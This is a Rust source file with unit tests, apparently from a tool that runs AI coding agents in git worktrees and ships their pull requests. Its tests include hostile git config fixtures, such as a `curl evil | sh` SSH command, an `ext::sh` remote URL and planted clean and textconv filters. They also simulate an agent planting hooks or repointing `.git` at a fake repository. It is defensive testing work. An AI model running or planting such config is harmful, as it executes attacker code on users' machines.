            "--dst-prefix=b/",
            "--no-relative",
            "--submodule=short",
            &range,
            "--",
        ],
        MAX_BRANCH_DIFF_BYTES,
    )?;
    Ok(parse_branch_diff(&output, cut_short, MAX_FILE_DIFF_LINES))
}

/// Parses a whole `git diff` that may have been cut at a byte cap (`cut_short`). The cut
/// usually lands mid-line, so the partial last line is dropped and the file it was in is
/// flagged truncated, along with the diff as a whole.
pub fn parse_branch_diff(patch: &str, cut_short: bool, max_file_lines: usize) -> BranchDiff {
    let complete = if cut_short {
        patch.rfind('\n').map_or("", |end| &patch[..end])
    } else {
        patch
    };
    let mut files = parse_diff(complete, max_file_lines);
    if cut_short {
        if let Some(last) = files.last_mut() {
            last.truncated = true;
        }
    }
    BranchDiff {
        files,
        truncated: cut_short,
    }
}

/// The hunk currently being read: its index in `FileDiff::hunks` (`None` once the file is
/// over its line budget) and the next line numbers / lines left on each side.
struct HunkCursor {
    index: Option<usize>,
    old_line: u32,
    new_line: u32,
    old_left: u32,
    new_left: u32,
}

/// Parses `git diff` patch output into one `FileDiff` per file. Defensive like the log
/// parsers: anything unrecognized is skipped, never a panic. Each file keeps at most
/// `max_file_lines` lines (then `truncated`), while its additions/deletions count them all.
pub fn parse_diff(patch: &str, max_file_lines: usize) -> Vec<FileDiff> {
    let mut files: Vec<FileDiff> = Vec::new();
    let mut kept_lines = 0usize;
    let mut cursor: Option<HunkCursor> = None;
    // Not `lines()`: that would also strip a `\r` that belongs to a CRLF file's content.
    for line in patch.split('\n') {
        if let Some(rest) = line.strip_prefix("diff --git ") {
            let path = parse_diff_git_paths(rest).unwrap_or_default();
            files.push(FileDiff {
                path,
                old_path: None,
                status: FileStatus::Modified,
                additions: 0,
                deletions: 0,
                binary: false,
                hunks: Vec::new(),
                truncated: false,
            });
            kept_lines = 0;
            cursor = None;
            continue;
        }
        let Some(file) = files.last_mut() else {
            continue;
        };

        if line.starts_with("@@") {
            let Some((old_start, old_lines, new_start, new_lines)) = parse_hunk_header(line) else {
                cursor = None;
                continue;
            };
            let index = if kept_lines < max_file_lines {
                file.hunks.push(Hunk {
                    header: line.to_string(),
                    old_start,
                    old_lines,
                    new_start,
                    new_lines,
                    lines: Vec::new(),
                });
                Some(file.hunks.len() - 1)
            } else {
                file.truncated = true;
                None
            };
            cursor = Some(HunkCursor {
                index,
                old_line: old_start,
                new_line: new_start,
                old_left: old_lines,
                new_left: new_lines,
            });
            continue;
        }

        if line.starts_with('\\') {
            // `\ No newline at end of file` (wording is localized) marks the line before it,
            // and can sit mid-hunk: after the old side's last line, before the new side's.
            if let Some(last) = cursor
                .as_ref()
                .and_then(|c| c.index)
                .and_then(|index| file.hunks[index].lines.last_mut())
            {
                last.no_newline = true;
            }
            continue;
        }

        if let Some(hunk) = cursor.as_mut().filter(|c| c.old_left > 0 || c.new_left > 0) {
            // `diff.suppressBlankEmpty` writes a blank context line as an empty line.
            let (kind, content) = match line.as_bytes().first() {
                Some(b'+') => (LineKind::Add, &line[1..]),
                Some(b'-') => (LineKind::Del, &line[1..]),
                Some(b' ') => (LineKind::Context, &line[1..]),
                None => (LineKind::Context, ""),
                Some(_) => {
                    cursor = None;
                    continue;
                }
            };
            let (old_line, new_line) = match kind {
                LineKind::Add => {
                    file.additions += 1;
                    hunk.new_left = hunk.new_left.saturating_sub(1);
                    hunk.new_line += 1;
                    (None, Some(hunk.new_line - 1))
                }
                LineKind::Del => {
                    file.deletions += 1;
                    hunk.old_left = hunk.old_left.saturating_sub(1);
                    hunk.old_line += 1;
                    (Some(hunk.old_line - 1), None)
                }
                LineKind::Context => {
                    hunk.old_left = hunk.old_left.saturating_sub(1);
                    hunk.new_left = hunk.new_left.saturating_sub(1);
                    hunk.old_line += 1;
                    hunk.new_line += 1;
                    (Some(hunk.old_line - 1), Some(hunk.new_line - 1))
                }
            };
            if kept_lines >= max_file_lines {
                hunk.index = None;
                file.truncated = true;
            }
            if let Some(index) = hunk.index {
                file.hunks[index].lines.push(HunkLine {
                    kind,
                    old_line,
                    new_line,
                    content: content.to_string(),
                    no_newline: false,
                });
                kept_lines += 1;
            }
            continue;
        }

        // Extended header lines between `diff --git` and the first hunk.
        if line.starts_with("new file mode ") {
            file.status = FileStatus::Added;
        } else if line.starts_with("deleted file mode ") {
            file.status = FileStatus::Deleted;
        } else if let Some(from) = line.strip_prefix("rename from ") {
            file.status = FileStatus::Renamed;
            file.old_path = Some(unquote_path(from));
        } else if let Some(to) = line.strip_prefix("rename to ") {
            file.status = FileStatus::Renamed;
            file.path = unquote_path(to);
        } else if let Some(new) = line.strip_prefix("+++ ") {
            if let Some(path) = side_path(new, "b/") {
                file.path = path;
            }
        } else if let Some(old) = line.strip_prefix("--- ") {
            // A deleted file's only path is on the `---` side.
            if file.status == FileStatus::Deleted {
                if let Some(path) = side_path(old, "a/") {
                    file.path = path;
                }
            }
        } else if line.starts_with("Binary files ") || line == "GIT binary patch" {
            file.binary = true;
        }
    }
    files
}

/// `@@ -a,b +c,d @@ …` → (a, b, c, d); an omitted count means 1.
fn parse_hunk_header(line: &str) -> Option<(u32, u32, u32, u32)> {
    let mut parts = line.strip_prefix("@@ ")?.split(' ');
    let old = parts.next()?.strip_prefix('-')?;
    let new = parts.next()?.strip_prefix('+')?;
    let range = |spec: &str| -> Option<(u32, u32)> {
        match spec.split_once(',') {
            Some((start, count)) => Some((start.parse().ok()?, count.parse().ok()?)),
            None => Some((spec.parse().ok()?, 1)),
        }
    };
    let (old_start, old_lines) = range(old)?;
    let (new_start, new_lines) = range(new)?;
    Some((old_start, old_lines, new_start, new_lines))
}

/// The path from a `---`/`+++` line, without its `a/`/`b/` prefix; `None` for `/dev/null`.
/// git appends a tab to a name containing spaces, and C-quotes unusual names.
fn side_path(spec: &str, prefix: &str) -> Option<String> {
    let spec = spec.strip_suffix('\t').unwrap_or(spec);
    if spec == "/dev/null" {
        return None;
    }
    let path = unquote_path(spec);
    Some(
        path.strip_prefix(prefix)
            .map(str::to_string)
            .unwrap_or(path),
    )
}

/// The path from `diff --git a/<p> b/<p>`. Only a fallback, used as-is for binary and
/// mode-only changes (no `---`/`+++` lines): renames always carry `rename from/to`, so here
/// both sides name the same file, which is how a path containing ` b/` is split correctly.
fn parse_diff_git_paths(rest: &str) -> Option<String> {
    if rest.starts_with('"') {
        let (first, _) = split_quoted(rest)?;
        return Some(
            first
                .strip_prefix("a/")
                .map(str::to_string)
                .unwrap_or(first),
        );
    }
    // `a/<p> b/<p>`: 2 + p + 1 + 2 + p bytes.
    let len = rest.len();
    if len >= 5 && (len - 5) % 2 == 0 {
        let p = (len - 5) / 2;
        if let (Some(a), Some(b)) = (rest.get(2..2 + p), rest.get(5 + p..)) {
            if rest.starts_with("a/") && rest.get(2 + p..5 + p) == Some(" b/") && a == b {
                return Some(a.to_string());
            }
        }
    }
    let (a, _) = rest.split_once(" b/")?;
    Some(a.strip_prefix("a/").unwrap_or(a).to_string())
}

/// Splits a leading C-quoted token off `text`, returning it unquoted and the remainder.
fn split_quoted(text: &str) -> Option<(String, &str)> {
    let bytes = text.as_bytes();
    let mut i = 1;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => i += 2,
            b'"' => return Some((unquote_path(&text[..=i]), &text[i + 1..])),
            _ => i += 1,
        }
    }
    None
}

/// Undoes git's C-style path quoting (`core.quotePath`): `"tab\there"`, octal escapes for
/// non-ASCII bytes. An unquoted path is returned unchanged.
fn unquote_path(text: &str) -> String {
    let Some(inner) = text
        .strip_prefix('"')
        .and_then(|rest| rest.strip_suffix('"'))
    else {
        return text.to_string();
    };
    let bytes = inner.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] != b'\\' || i + 1 >= bytes.len() {
            out.push(bytes[i]);
            i += 1;
            continue;
        }
        let escaped = bytes[i + 1];
        i += 2;
        match escaped {
            b'a' => out.push(0x07),
            b'b' => out.push(0x08),
            b'f' => out.push(0x0c),
            b'n' => out.push(b'\n'),
            b'r' => out.push(b'\r'),
            b't' => out.push(b'\t'),
            b'v' => out.push(0x0b),
            b'0'..=b'7' => {
                let mut value = u32::from(escaped - b'0');
                let mut digits = 1;
                while digits < 3 && i < bytes.len() && (b'0'..=b'7').contains(&bytes[i]) {
                    value = value * 8 + u32::from(bytes[i] - b'0');
                    i += 1;
                    digits += 1;
                }
                out.push(value as u8);
            }
            other => out.push(other),
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn context<'a>(title: &'a str, prompt: &'a str) -> ShipContext<'a> {
        ShipContext {
            title,
            prompt,
            agent: "claude",
            model: "opus",
            summary: Some("Fixed the login redirect."),
        }
    }

    #[test]
    fn slugs_are_lowercase_dash_separated_and_bounded() {
        assert_eq!(
            slugify("Fix the Login  redirect!"),
            "fix-the-login-redirect"
        );
        assert_eq!(slugify("   "), "task");
        assert_eq!(slugify("日本語"), "task");
        assert!(slugify(&"word ".repeat(40)).len() <= MAX_SLUG_LEN);
        assert!(!slugify(&"ab-".repeat(30)).ends_with('-'));
    }

    #[test]
    fn branch_names_are_namespaced_and_unique_per_task() {
        assert_eq!(
            branch_name("Add dark mode", "1f2e3d4c-aaaa-bbbb"),
            "relay/add-dark-mode-1f2e3d4c"
        );
    }

    #[test]
    fn commit_types_follow_the_tag_heuristic_with_fix_winning() {
        assert_eq!(commit_type("Fix the add button", ""), "fix");
        assert_eq!(commit_type("Add dark mode", ""), "feat");
        assert_eq!(commit_type("Refactor the parser", ""), "refactor");
        assert_eq!(commit_type("Update the README", ""), "docs");
        assert_eq!(commit_type("Bump deps", ""), "chore");
    }

    #[test]
    fn conventional_titles_lowercase_the_subject_and_keep_existing_prefixes() {
        assert_eq!(
            conventional_title("Fix login redirect", ""),
            "fix: fix login redirect"
        );
        assert_eq!(
            conventional_title("feat(board): drag cards", ""),
            "feat(board): drag cards"
        );
    }

    #[test]
    fn pr_body_carries_summary_task_and_provenance() {
        let body = pr_body(
            &context("Fix login", "Make /login redirect home"),
            "relay/x",
        );
        assert!(body.contains("Fixed the login redirect."));
        assert!(body.contains("Make /login redirect home"));
        assert!(body.contains("`claude`"));
        assert!(body.contains("`relay/x`"));

        let mut no_summary = context("Fix login", "p");
        no_summary.summary = Some("   ");
        assert!(pr_body(&no_summary, "b").contains("did not leave a final summary"));
    }

    #[test]
    fn repo_level_exec_config_is_flagged_but_user_config_and_lfs_are_not() {
        let listing = "\
global\tcore.sshcommand=ssh -i ~/.ssh/work
system\tcredential.helper=osxkeychain
local\tremote.origin.url=git@github.com:o/r.git
local\tcore.hookspath=.husky
local\tcore.fsmonitor=true
local\tfilter.lfs.clean=git-lfs clean -- %f
local\tfilter.lfs.required=true
local\tcore.sshCommand=sh -c 'curl evil | sh'
worktree\tgpg.ssh.program=/tmp/x
local\tfilter.pwn.clean=./pwn.sh
local\tincludeIf.gitdir:/tmp/.path=/tmp/evil
local\tprotocol.file.allow=always
local\tprotocol.file.allow=user
command\tcore.pager=less";
        assert_eq!(
            unsafe_repo_config(listing),
            vec![
                "core.sshCommand",
                "gpg.ssh.program",
                "filter.pwn.clean",
                "includeIf.gitdir:/tmp/.path",
                "protocol.file.allow",
            ]
        );
        assert!(ensure_safe_config("local\tuser.name=me").is_ok());
        let error = ensure_safe_config("local\tdiff.x.textconv=./t").unwrap_err();
        assert!(error.to_string().contains("diff.x.textconv"));
        let spoofed_lfs = "local\tfilter.lfs.process=sh -c evil";
        assert_eq!(unsafe_repo_config(spoofed_lfs), vec!["filter.lfs.process"]);
    }

    #[test]
    fn github_remotes_come_from_repo_config_with_origin_first() {
        let listing = "\
global\tremote.origin.url=https://github.com/global/ignored
local\tremote.upstream.url=git@github.com:Up/Stream.git
local\tremote.origin.url=https://github.com/me/fork.git
local\tremote.gitlab.url=https://gitlab.com/me/fork
local\tremote.my.dotted.url=github.com/me/dotted
local\tremote.dupe.url=git@github.com:ME/FORK
local\tremote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
local\tremote.evil.url=ext::sh -c touch% /tmp/pwned";
        assert_eq!(
            github_remote_candidates(listing),
            vec!["me/fork", "Up/Stream", "me/dotted"]
        );
        assert!(github_remote_candidates("local\tuser.name=me").is_empty());
    }

    #[test]
    fn repo_view_json_yields_a_validated_name_with_owner() {
        assert_eq!(
            parse_repo_view_json("{\"nameWithOwner\":\"TanmayDabhade/Relay\"}\n").as_deref(),
            Some("TanmayDabhade/Relay")
        );
        assert_eq!(parse_repo_view_json("{\"name\":\"Relay\"}"), None);
        assert_eq!(parse_repo_view_json("not json"), None);
        assert_eq!(parse_repo_view_json("{\"nameWithOwner\":\"-x/y\"}"), None);
        assert_eq!(parse_repo_view_json("{\"nameWithOwner\":\"a/b/c\"}"), None);
    }

    #[test]
    fn folder_checks_settle_locally_without_gh_when_there_is_no_github_remote() {
        let base = std::env::temp_dir().join(format!(
            "relay-gh-check-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default()
        ));
        let plain = base.join("plain");
        std::fs::create_dir_all(&plain).unwrap();
        assert!(matches!(
            check_folder_github(&base.join("missing")),
            GithubCheck::NotGithub(_)
        ));
        let repo = base.join("repo");
        std::fs::create_dir_all(repo.join("sub")).unwrap();
        git(&repo, &["init", "-q"]).unwrap();
        assert_eq!(
            check_folder_github(&repo),
            GithubCheck::NotGithub("no GitHub remote".into())
        );
        git(
            &repo,
            &["remote", "add", "origin", "https://gitlab.com/o/n"],
        )
        .unwrap();
        git(&repo, &["remote", "add", "gh", "git@github.com:o/n.git"]).unwrap();
        // Read from a subdirectory too: a project can be a folder inside its repo.
        assert_eq!(
            local_github_remotes(&repo.join("sub")),
            Some(vec!["o/n".to_string()])
        );
        // `plain` may sit inside some enclosing checkout on a dev machine, so only assert
        // it doesn't crash and isn't misread as `o/n`.
        assert_ne!(local_github_remotes(&plain), Some(vec!["o/n".to_string()]));
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn pr_url_is_taken_from_the_last_url_line() {
        let stdout =
            "Creating pull request for relay/x into main\n\nhttps://github.com/o/r/pull/12\n";
        assert_eq!(
            parse_pr_url(stdout).as_deref(),
            Some("https://github.com/o/r/pull/12")
        );
        assert_eq!(parse_pr_url("nothing here"), None);
    }

    /// A real (local, network-free) repo: worktree creation, commit, ahead count, removal.
    #[test]
    fn workspace_lifecycle_against_a_local_repo() {
        let base = std::env::temp_dir().join(format!(
            "relay-ship-test-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default()
        ));
        let repo = base.join("repo");
        let app_dir = base.join("app");
        std::fs::create_dir_all(repo.join("web")).unwrap();
        let g = |dir: &Path, args: &[&str]| git(dir, args).unwrap();
        g(&repo, &["init", "-q", "-b", "main"]);
        g(&repo, &["config", "user.email", "relay@test"]);
        g(&repo, &["config", "user.name", "Relay Test"]);
        g(&repo, &["config", "commit.gpgsign", "false"]);
        std::fs::write(repo.join("web/README.md"), "hi\n").unwrap();
        g(&repo, &["add", "-A"]);
        g(&repo, &["commit", "-q", "-m", "init"]);

        // The project is a subdirectory of the repo: work_dir must mirror that.
        let project = repo.join("web");
        let ws = prepare_workspace(
            &app_dir.join("worktrees"),
            project.to_str().unwrap(),
            "abcdef12-3456",
            "Add a greeting",
            true,
            1,
        )
        .unwrap();
        assert_eq!(ws.base_branch, "main");
        assert_eq!(ws.branch, "relay/add-a-greeting-abcdef12");
        assert!(ws.work_dir.ends_with("/web"));
        assert!(Path::new(&ws.work_dir).join("README.md").is_file());

        let worktree = Path::new(&ws.worktree_path);
        assert!(!commit_all(&ws, "nothing").unwrap());
        assert_eq!(commits_ahead(&ws).unwrap(), 0);

        // A tracked hooks dir (husky-style) the agent could have edited: Relay's commit must
        // not run it. The hook would both fail the commit and leave a marker file.
        let hooks = Path::new(&ws.worktree_path).join(".githooks");
        std::fs::create_dir_all(&hooks).unwrap();
        let marker = base.join("hook-ran");
        let hook = hooks.join("pre-commit");
        std::fs::write(
            &hook,
            format!("#!/bin/sh\ntouch '{}'\nexit 1\n", marker.display()),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        g(worktree, &["config", "core.hooksPath", ".githooks"]);

        std::fs::write(Path::new(&ws.work_dir).join("hello.txt"), "hello\n").unwrap();
        // Dirty worktrees are never removed.
        assert!(!remove_worktree(&ws).unwrap());
        // The agent repoints the worktree's `.git` file at a repository it made up, whose
        // config runs a command on `git status`. Relay must keep using the real repository.
        let fake = base.join("fake");
        std::fs::create_dir_all(&fake).unwrap();
        g(&fake, &["init", "-q"]);
        let fsmonitor_marker = base.join("fsmonitor-ran");
        g(
            &fake,
            &[
                "config",
                "core.fsmonitor",
                &format!("touch '{}'", fsmonitor_marker.display()),
            ],
        );
        let dot_git = worktree.join(".git");
        let real_dot_git = std::fs::read_to_string(&dot_git).unwrap();
        std::fs::write(
            &dot_git,
            format!("gitdir: {}\n", fake.join(".git").display()),
        )
        .unwrap();

        assert!(commit_all(&ws, "feat: add a greeting").unwrap());
        assert!(
            !fsmonitor_marker.exists(),
            "Relay must never use a repository the agent pointed .git at"
        );
        // The commit landed on the task's real branch, not in the fake repo.
        let log = g(
            Path::new(&ws.repo_root),
            &["log", "-1", "--format=%s", &ws.branch],
        );
        assert_eq!(log, "feat: add a greeting");
        std::fs::write(&dot_git, real_dot_git).unwrap();

        // A clean filter planted in the repository's own config (as an agent running in the
        // main checkout could do) must stop Relay before `git status`/`add` can invoke it.
        let filter_marker = base.join("filter-ran");
        let filter_cmd = format!("touch '{}'; cat", filter_marker.display());
        g(
            Path::new(&ws.repo_root),
            &["config", "filter.pwn.clean", &filter_cmd],
        );
        std::fs::write(
            Path::new(&ws.worktree_path).join(".gitattributes"),
            "* filter=pwn\n",
        )
        .unwrap();
        let error = ship(&ws, &context("Add a greeting", "p")).unwrap_err();
        assert!(error.to_string().contains("filter.pwn.clean"), "{error}");
        assert!(!filter_marker.exists(), "the planted filter must never run");
        g(
            Path::new(&ws.repo_root),
            &["config", "--unset", "filter.pwn.clean"],
        );
        std::fs::remove_file(Path::new(&ws.worktree_path).join(".gitattributes")).unwrap();
        assert!(
            !marker.exists(),
            "Relay's commit must never run repository hooks"
        );
        assert_eq!(commits_ahead(&ws).unwrap(), 1);
        // The main checkout is untouched.
        assert!(!project.join("hello.txt").exists());

        // Without an origin remote, ship stops after committing with a clear error.
        let error = ship(&ws, &context("Add a greeting", "p")).unwrap_err();
        assert!(error.to_string().contains("origin"));

        assert!(remove_worktree(&ws).unwrap());
        assert!(!worktree.exists());
        // A retry after removal recreates the worktree on the same branch, commits intact.
        assert!(ensure_worktree(&ws).unwrap());
        assert!(Path::new(&ws.work_dir).join("hello.txt").is_file());
        assert!(!ensure_worktree(&ws).unwrap());

        let _ = remove_worktree(&ws);
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn commit_log_records_parse_and_cut_records_are_skipped() {
        let output = "aaaa\x1faa\x1fAda\x1f100\x1ffeat: one\x1e\nbbbb\x1fbb\x1fBo\x1f200\x1ffix: two | x\x1e\ncccc\x1fcc\x1fCy";
        let commits = parse_commit_log(output);
        assert_eq!(commits.len(), 2);
        assert_eq!(
            commits[1],
            CommitInfo {
                sha: "bbbb".into(),
                short_sha: "bb".into(),
                subject: "fix: two | x".into(),
                author: "Bo".into(),
                timestamp: 200,
            }
        );
        assert!(parse_commit_log("").is_empty());
    }

    const ADDED: &str = "diff --git a/new.txt b/new.txt
new file mode 100644
index 0000000..3b18e51
--- /dev/null
+++ b/new.txt
@@ -0,0 +1,2 @@
+hello
+world
";

    #[test]
    fn added_files_number_new_lines_only() {
        let files = parse_diff(ADDED, 100);
        assert_eq!(files.len(), 1);
        let file = &files[0];
        assert_eq!(file.path, "new.txt");
        assert_eq!(file.status, FileStatus::Added);
        assert_eq!((file.additions, file.deletions), (2, 0));
        assert_eq!(file.old_path, None);
        let hunk = &file.hunks[0];
        assert_eq!(
            (
                hunk.old_start,
                hunk.old_lines,
                hunk.new_start,
                hunk.new_lines
            ),
            (0, 0, 1, 2)
        );
        assert_eq!(
            hunk.lines[1],
            HunkLine {
                kind: LineKind::Add,
                old_line: None,
                new_line: Some(2),
                content: "world".into(),
                no_newline: false,
            }
        );
    }

    #[test]
    fn modified_files_track_both_sides_and_keep_header_lookalikes_as_content() {
        let patch = "diff --git a/src/lib.rs b/src/lib.rs
index 1111111..2222222 100644
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -10,4 +10,4 @@ fn main() {
 keep
--- a removed line that looks like a header
+++ an added line that looks like a header
 
 tail
@@ -40 +40,2 @@
-x
+y
+z
";
        let files = parse_diff(patch, 100);
        assert_eq!(files.len(), 1);
        let file = &files[0];
        assert_eq!(file.path, "src/lib.rs");
        assert_eq!(file.status, FileStatus::Modified);
        assert_eq!((file.additions, file.deletions), (3, 2));
        assert_eq!(file.hunks.len(), 2);
        let first = &file.hunks[0];
        assert_eq!(first.header, "@@ -10,4 +10,4 @@ fn main() {");
        let numbers: Vec<_> = first
            .lines
            .iter()
            .map(|l| (l.kind, l.old_line, l.new_line))
            .collect();
        assert_eq!(
            numbers,
            vec![
                (LineKind::Context, Some(10), Some(10)),
                (LineKind::Del, Some(11), None),
                (LineKind::Add, None, Some(11)),
                (LineKind::Context, Some(12), Some(12)),
                (LineKind::Context, Some(13), Some(13)),
            ]
        );
        assert_eq!(
            first.lines[1].content,
            "-- a removed line that looks like a header"
        );
        assert_eq!(first.lines[3].content, "");
        // `@@ -40 +40,2 @@`: an omitted count is 1.
        assert_eq!(file.hunks[1].old_lines, 1);
        assert_eq!(file.hunks[1].lines.len(), 3);
    }

    #[test]
    fn deleted_files_take_their_path_from_the_base_side() {
        let patch = "diff --git a/old dir/gone.txt b/old dir/gone.txt
deleted file mode 100644
index 3b18e51..0000000
--- a/old dir/gone.txt\t
+++ /dev/null
@@ -1 +0,0 @@
-bye
";
        let file = &parse_diff(patch, 100)[0];
        assert_eq!(file.status, FileStatus::Deleted);
        assert_eq!(file.path, "old dir/gone.txt");
        assert_eq!((file.additions, file.deletions), (0, 1));
        assert_eq!(file.hunks[0].lines[0].old_line, Some(1));
    }

    #[test]
    fn renames_keep_both_paths_with_or_without_edits() {
        let patch = "diff --git a/a.txt b/b.txt
similarity index 100%
rename from a.txt
rename to b.txt
diff --git \"a/tab\\there.txt\" \"b/caf\\303\\251.txt\"
similarity index 80%
rename from \"tab\\there.txt\"
rename to \"caf\\303\\251.txt\"
index 1111111..2222222 100644
--- \"a/tab\\there.txt\"
+++ \"b/caf\\303\\251.txt\"
@@ -1,2 +1,2 @@
 same
-old
+new
";
        let files = parse_diff(patch, 100);
        assert_eq!(files.len(), 2);
        assert_eq!(files[0].status, FileStatus::Renamed);
        assert_eq!(files[0].old_path.as_deref(), Some("a.txt"));
        assert_eq!(files[0].path, "b.txt");
        assert!(files[0].hunks.is_empty());
        assert_eq!(files[1].status, FileStatus::Renamed);
        assert_eq!(files[1].old_path.as_deref(), Some("tab\there.txt"));
        assert_eq!(files[1].path, "café.txt");
        assert_eq!((files[1].additions, files[1].deletions), (1, 1));
    }

    #[test]
    fn binary_files_are_flagged_without_hunks() {
        let patch = "diff --git a/img/logo b/x.png b/img/logo b/x.png
new file mode 100644
index 0000000..1234567
Binary files /dev/null and b/img/logo b/x.png differ
diff --git a/after.txt b/after.txt
index 1111111..2222222 100644
--- a/after.txt
+++ b/after.txt
@@ -1 +1 @@
-a
+b
";
        let files = parse_diff(patch, 100);
        assert_eq!(files.len(), 2);
        // A path containing ` b/` is still split right: both sides of the header match.
        assert_eq!(files[0].path, "img/logo b/x.png");
        assert!(files[0].binary);
        assert_eq!(files[0].status, FileStatus::Added);
        assert!(files[0].hunks.is_empty());
        assert_eq!((files[0].additions, files[0].deletions), (0, 0));
        assert!(!files[1].binary);
        assert_eq!(files[1].path, "after.txt");
    }

    #[test]
    fn missing_trailing_newlines_mark_their_line_even_mid_hunk() {
        let patch = "diff --git a/f.txt b/f.txt
index 1111111..2222222 100644
--- a/f.txt
+++ b/f.txt
@@ -1,2 +1,2 @@
 keep\r
-old
\\ No newline at end of file
+new
\\ No newline at end of file
";
        let file = &parse_diff(patch, 100)[0];
        let lines = &file.hunks[0].lines;
        assert_eq!(lines.len(), 3, "the + line after a mid-hunk marker is kept");
        // A CRLF file's `\r` is content, not a line ending to strip.
        assert_eq!(lines[0].content, "keep\r");
        assert!(!lines[0].no_newline);
        assert!(lines[1].no_newline && lines[1].kind == LineKind::Del);
        assert!(lines[2].no_newline && lines[2].kind == LineKind::Add);
        assert_eq!((file.additions, file.deletions), (1, 1));
    }

    #[test]
    fn long_files_keep_a_bounded_number_of_lines_but_count_them_all() {
        let mut patch = String::from(
            "diff --git a/big.txt b/big.txt\n--- a/big.txt\n+++ b/big.txt\n@@ -1,3 +1,3 @@\n",
        );
        patch.push_str("-a\n-b\n-c\n+A\n+B\n+C\n@@ -10 +10 @@\n-x\n+X\n");
        patch.push_str(ADDED);
        let files = parse_diff(&patch, 4);
        assert_eq!(files.len(), 2);
        let big = &files[0];
        assert!(big.truncated);
        assert_eq!(big.hunks.len(), 1, "hunks past the budget are dropped");
        assert_eq!(big.hunks[0].lines.len(), 4);
        assert_eq!((big.additions, big.deletions), (4, 4));
        // The budget is per file.
        assert!(!files[1].truncated);
        assert_eq!(files[1].hunks[0].lines.len(), 2);
    }

    #[test]
    fn a_diff_cut_at_the_byte_cap_drops_the_partial_line_and_flags_it() {
        let whole = format!("{ADDED}diff --git a/z.txt b/z.txt\n--- a/z.txt\n+++ b/z.txt\n@@ -1,2 +1,2 @@\n-one\n+tw");
        let cut = parse_branch_diff(&whole, true, 100);
        assert!(cut.truncated);
        assert_eq!(cut.files.len(), 2);
        assert!(!cut.files[0].truncated);
        let last = &cut.files[1];
        assert!(last.truncated);
        assert_eq!(
            last.hunks[0].lines.len(),
            1,
            "the half-read `+tw` line is dropped"
        );
        assert_eq!(last.hunks[0].lines[0].content, "one");

        let full = parse_branch_diff(ADDED, false, 100);
        assert!(!full.truncated);
        assert!(!full.files[0].truncated);
        assert!(parse_branch_diff("", false, 100).files.is_empty());
    }

    /// A real (local, network-free) repo: the branch's commits and diff, read through the
    /// worktree while it exists and from the main checkout once it's gone.
    #[test]
    fn branch_changes_against_a_local_repo() {
        let base = std::env::temp_dir().join(format!(
            "relay-changes-test-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default()
        ));
        let repo = base.join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let g = |dir: &Path, args: &[&str]| git(dir, args).unwrap();
        g(&repo, &["init", "-q", "-b", "main"]);
        g(&repo, &["config", "user.email", "relay@test"]);
        g(&repo, &["config", "user.name", "Relay Test"]);
        g(&repo, &["config", "commit.gpgsign", "false"]);
        std::fs::write(repo.join("keep.txt"), "one\ntwo\nthree\n").unwrap();
        std::fs::write(repo.join("gone.txt"), "bye\n").unwrap();
        std::fs::write(repo.join("move.txt"), "a\nb\nc\nd\ne\n").unwrap();
        g(&repo, &["add", "-A"]);
        g(&repo, &["commit", "-q", "-m", "init"]);

        let mut ws = prepare_workspace(
            &base.join("app").join("worktrees"),
            repo.to_str().unwrap(),
            "fedcba98-7654",
            "Tidy files",
            true,
            1,
        )
        .unwrap();
        let worktree = PathBuf::from(&ws.worktree_path);
        assert!(branch_commits(&ws).unwrap().is_empty());
        assert!(branch_diff(&ws).unwrap().files.is_empty());

        std::fs::write(worktree.join("keep.txt"), "one\nTWO\nthree\n").unwrap();
        std::fs::remove_file(worktree.join("gone.txt")).unwrap();
        std::fs::write(worktree.join("new.bin"), [0u8, 159, 146, 150, 0, 1]).unwrap();
        g(&worktree, &["add", "-A"]);
        g(&worktree, &["commit", "-q", "-m", "feat: first"]);
        g(&worktree, &["mv", "move.txt", "moved.txt"]);
        g(&worktree, &["commit", "-q", "-m", "refactor: second"]);
        // Uncommitted work isn't on the branch, so it isn't part of the PR.
        std::fs::write(worktree.join("scratch.txt"), "wip\n").unwrap();
        // Work that lands on the base after the fork isn't part of the PR either.
        std::fs::write(repo.join("later.txt"), "base\n").unwrap();
        g(&repo, &["add", "-A"]);
        g(&repo, &["commit", "-q", "-m", "on main"]);

        let check = |ws: &TaskWorkspace| {
            let commits = branch_commits(ws).unwrap();
            let subjects: Vec<_> = commits.iter().map(|c| c.subject.as_str()).collect();
            assert_eq!(subjects, ["feat: first", "refactor: second"]);
            assert_eq!(commits[0].author, "Relay Test");
            assert!(commits[0].sha.starts_with(&commits[0].short_sha));
            assert!(commits[0].timestamp > 0);

            let diff = branch_diff(ws).unwrap();
            assert!(!diff.truncated);
            let summary: Vec<_> = diff
                .files
                .iter()
                .map(|f| {
                    (
                        f.path.as_str(),
                        f.status,
                        f.binary,
                        f.additions,
                        f.deletions,
                    )
                })
                .collect();
            assert_eq!(
                summary,
                [
                    ("gone.txt", FileStatus::Deleted, false, 0, 1),
                    ("keep.txt", FileStatus::Modified, false, 1, 1),
                    ("moved.txt", FileStatus::Renamed, false, 0, 0),
                    ("new.bin", FileStatus::Added, true, 0, 0),
                ]
            );
            assert_eq!(diff.files[2].old_path.as_deref(), Some("move.txt"));
        };
        check(&ws);

        // Repository config that would run a program stops the read before git can act on it.
        g(&repo, &["config", "diff.pwn.textconv", "touch pwned; cat"]);
        let error = branch_diff(&ws).unwrap_err();
        assert!(error.to_string().contains("diff.pwn.textconv"), "{error}");
        g(&repo, &["config", "--unset", "diff.pwn.textconv"]);

        // Once the worktree is gone, the same answers come from the branch ref in the checkout.
